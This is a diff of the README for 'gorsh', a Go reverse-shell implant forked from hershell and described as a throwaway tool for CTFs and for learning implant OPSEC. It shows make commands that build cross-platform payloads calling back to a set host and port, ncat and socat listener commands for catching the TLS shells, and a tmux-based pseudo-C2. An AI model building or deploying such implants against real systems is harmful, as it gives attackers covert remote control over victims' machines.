@@ -1,20 +1,34 @@
-# Hershell
+# gorsh
 
-Modified version of Hershell from @sysdream - [https://github.com/sysdream/hershell](https://github.com/sysdream/hershell)
+[go]lang [r]everse [sh]ell
 
-Pulled out the Meterpreter / Shellcode Injection functionality ... needs quiet.
+Originally forked from - [sysdream/hershell](https://github.com/sysdream/hershell)
 
-Added build script & listener script.
+## Motivation
+
+Learn go.  
+Make a throwaway reverse shell for things like CTFs.  
+Learn about host-based OPSEC considerations when writing an implant.
+
+## Fork Changes
+Changes after fork:
+
+* Uses tmux as a psudeo-C2 interface, creating a new window with each agent callback
+* Removed Meterpreter functionality
+* Removed Shellcode execution
+* Remove the use of passing power/shell commands at the gorsh prompt
+* Add common file operation commands that use go instead of power/shell
 
 TODO:
 
-Potentially add reverse socks5 proxy functionality - Using [https://github.com/Numbers11/rvprxmx](https://github.com/Numbers11/rvprxmx)
+Potentially add reverse socks5 proxy functionality - Using
+[Numbers11/rvprxmx](https://github.com/Numbers11/rvprxmx)
 
 --
 
 Simple TCP reverse shell written in [Go](https://golang.org).
 
-It uses TLS to secure the communications, and provide a certificate public key fingerprint pinning feature, preventing from traffic interception.
+It uses TLS to secure the communications, and key fingerprint pinning.
 
 Supported OS are:
 
@@ -23,22 +37,11 @@ Supported OS are:
 - Mac OS
 - FreeBSD and derivatives
 
-## Why ?
-
-Although meterpreter payloads are great, they are sometimes spotted by AV products.
-
-The goal of this project is to get a simple reverse shell, which can work on multiple systems.
-
-## How ?
-
-Since it's written in Go, you can cross compile the source for the desired architecture.
 
 ## Getting started & dependencies
 
 As this is a Go project, you will need to follow the [official documentation](https://golang.org/doc/install) to set up
 your Golang environment (with the `$GOPATH` environment variable).
-
-Then, just run `go get github.com/f47h3r/hershell` to fetch the project.
 
 ### Building the payload
 
@@ -66,13 +69,8 @@ For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment 
 
 ### Using the shell
 
-Once executed, you will be provided with a remote shell.
-This custom interactive shell will allow you to execute system commands through `cmd.exe` on Windows, or `/bin/sh` on UNIX machines.
-
-The following special commands are supported:
-
-* ``run_shell`` : drops you an system shell (allowing you, for example, to change directories)
-* ``exit`` : exit gracefully
+Once executed, you will be provided with a remote shell. 
+Type `help` to show what commands are supported.
 
 ## Usage
 
@@ -88,57 +86,31 @@ writing new private key to 'server.key'
 cat server.key >> server.pem
 ```
 
-For windows:
+Then:
 
 ```bash
-# Predifined 32 bit target
-$ make windows32 LHOST=192.168.0.12 LPORT=1234
-# Predifined 64 bit target
-$ make windows64 LHOST=192.168.0.12 LPORT=1234
+$ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
 ```
 
-For Linux:
-```bash
-# Predifined 32 bit target
-$ make linux32 LHOST=192.168.0.12 LPORT=1234
-# Predifined 64 bit target
-$ make linux64 LHOST=192.168.0.12 LPORT=1234
-```
+## Catching the shell
 
-For Mac OS X
-```bash
-# Predifined 32 bit target
-$ make macos32 LHOST=192.168.0.12 LPORT=1234
-# Predifined 64 bit target
-$ make macos64 LHOST=192.168.0.12 LPORT=1234
-```
+The `local/start.sh` kicks off a tmux session and new windows on every new connection.
 
-## Examples
-
-### Basic usage
-
-One can use various tools to handle incomming connections, such as:
+Shells can also be caught with:
 
 * socat (not working on macos)
 * ncat
 * openssl server module
 * metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)
 
-Here is an example with `ncat`:
+__Examples__
 
 ```bash
 $ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
-Ncat: Version 7.60 ( https://nmap.org/ncat )
-Ncat: Listening on :::1234
-Ncat: Listening on 0.0.0.0:1234
-Ncat: Connection from 172.16.122.105.
-Ncat: Connection from 172.16.122.105:47814.
-[hershell]> whoami
-desktop-3pvv31a\lab
+$ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
 ```
 
 ## Credits
 
 Initial Work - Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
 Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
-
